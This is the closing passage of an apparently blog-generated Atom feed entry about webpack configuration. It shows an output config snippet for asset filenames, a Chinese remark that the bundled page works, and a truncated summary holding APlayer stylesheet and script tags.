&#123;</span><br><span class="line">  path: path.resolve(__dirname, <span class="string">&#x27;dist/&#x27;</span>),</span><br><span class="line">  filename: <span class="string">&#x27;assets/[name].js&#x27;</span>,</span><br><span class="line">  assetModuleFilename: <span class="string">&#x27;assets/[name][ext]&#x27;</span></span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>这时候打包一下，预览一下页面，发现都正常引入和使用。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="webpack" scheme="http://aiolimp.com/categories/webpack/"/>
    
    
    <category term="webpack" scheme="http://aiolimp.com/tags/webpack/"/>
    
  </entry>
  
</feed>
